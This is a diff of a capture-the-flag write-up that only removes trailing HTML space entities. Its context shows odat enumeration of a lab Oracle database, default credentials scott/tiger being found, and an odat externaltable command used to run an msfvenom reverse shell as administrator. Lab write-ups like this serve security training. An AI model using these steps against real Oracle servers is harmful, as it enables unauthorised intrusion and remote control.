@@ -50,7 +50,7 @@ So this was an Oracle port. Based on Hacktricks, we can try using `odat.py` to a
 
 {% embed url="https://github.com/quentinhardy/odat" %}
 
-We can run the enumeration to find all SIDs and possible passwords before attacking it.&#x20;
+We can run the enumeration to find all SIDs and possible passwords before attacking it.
 
 ```
 $ ./odat.py all -s 10.129.95.188 -p 1521 
@@ -60,7 +60,7 @@ $ ./odat.py all -s 10.129.95.188 -p 1521
 [+] Valid credentials found: scott/tiger. Continue...                  
 ```
 
-We found the database and also some credentials, which I think is enough to exploit this system easily. With these, we can upload a reverse shell onto the server rather easily.&#x20;
+We found the database and also some credentials, which I think is enough to exploit this system easily. With these, we can upload a reverse shell onto the server rather easily.
 
 First, we can create a reverse shell via `msfvenom`:
 
@@ -83,6 +83,6 @@ $ ./odat.py externaltable -s 10.129.95.188 -p 1521 -d XE -U scott -P tiger --sys
 ```
 {% endcode %}
 
-We would gain a reverse shell as the administrator.&#x20;
+We would gain a reverse shell as the administrator.
 
 <figure><img src="../../../.gitbook/assets/image (3685).png" alt=""><figcaption></figcaption></figure>
